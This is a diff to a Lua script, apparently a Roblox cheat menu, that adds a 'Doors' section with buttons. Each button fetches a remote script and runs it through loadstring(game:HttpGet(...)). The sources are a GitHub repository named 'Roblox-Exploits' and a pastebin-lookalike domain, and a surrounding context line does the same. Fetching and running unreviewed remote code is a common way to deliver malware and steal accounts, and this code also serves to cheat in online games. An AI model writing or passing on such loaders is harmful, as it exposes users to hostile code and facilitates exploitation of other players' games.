@@ -340,6 +340,20 @@ Tab:AddButton({
        loadstring(game:HttpGet("https://scriptblox.com/raw/Cant-Say-the-Word-Can-Say-word-4686"))() end })
 
 local Section = Tab:AddSection({ 
+    Name = "Doors" }) 
+
+Tab:AddButton({ 
+    Name = "No Name",
+    Callback = function() 
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))() end })
+
+
+Tab:AddButton({ 
+    Name = "Doors Hack (OP) By BlackKing ",
+    Callback = function() 
+       loadstring(game:HttpGet(('https://pastebinp.com/raw/R8QMbhzv')))() end })
+
+local Section = Tab:AddSection({ 
     Name = "Sol's RNG" }) 
 
 Tab:AddButton({
